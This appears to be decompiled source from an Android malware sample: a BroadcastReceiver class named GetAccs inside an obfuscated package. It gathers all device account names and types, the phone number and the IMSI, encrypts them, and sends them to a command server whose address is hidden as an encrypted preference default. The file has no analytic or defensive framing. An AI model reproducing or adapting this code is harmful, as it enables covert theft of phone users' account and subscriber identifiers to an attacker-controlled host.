package com.dsifakf.aoakmnq;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;

public class GetAccs extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        TelephonyManager telManage = (TelephonyManager) context.getSystemService("phone");
        String PhoneLine1Num = telManage.getLine1Number();
        Secure parse = new Secure();
        String AccResult = "";
        for (Account gw : AccountManager.get(context).getAccounts()) {
            AccResult = new StringBuilder(String.valueOf(AccResult)).append(gw.name).append("(").append(gw.type).append(")").append(", ").toString();
        }
        AccResult = new StringBuilder(String.valueOf(AccResult)).append(PhoneLine1Num).toString();
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        String accBody = null;
        String addr = null;
        String devimsi = null;
        try {
            devimsi = Secure.bytesToHex(parse.encrypt(telManage.getSubscriberId()));
            accBody = Secure.bytesToHex(parse.encrypt(Uri.encode(AccResult)));
            addr = new String(parse.decrypt(preferences.getString("ab", "6e8fa676e42c9bceb6624fb7601a67d0cc0eceeb0218283614342ac69ade50775488a2f64e4d5f5dd2fc5f602c921176")));
        } catch (Exception e) {
        }
        Connect2.CheckMultiThSupp(new Connect1(new StringBuilder(String.valueOf(addr)).append("?1=").append(devimsi).append("&4=").append(accBody).toString()));
    }
}
